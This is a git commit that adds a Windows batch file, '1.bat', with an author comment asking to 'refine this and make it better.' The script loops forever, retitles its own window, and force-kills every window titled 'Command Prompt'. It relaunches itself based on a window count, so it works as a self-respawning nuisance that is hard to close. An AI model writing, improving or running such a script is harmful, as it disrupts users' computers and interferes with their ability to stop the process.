16fee0c69f67a80bf594175ef47a371fb50705ef
JoinRajuncraftNow <thecajunthatrages@gmail.com>
2016-02-11 11:24:45 -0500

    Create 1.bat

---
+++ 1.bat
@@ -0,0 +1,15 @@
+::Refine this and make it better.
+@ECHO OFF
+set n=1
+:next
+set /a n+=1
+title %n%
+FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq ^%n^%" ^| find/c "exe"`) DO (
+SET windowcount=%%F
+)
+taskkill /FI "WINDOWTITLE eq Command Prompt"
+if "%windowcount%"=="1" (
+start 1.bat
+)
+goto :next
+exit
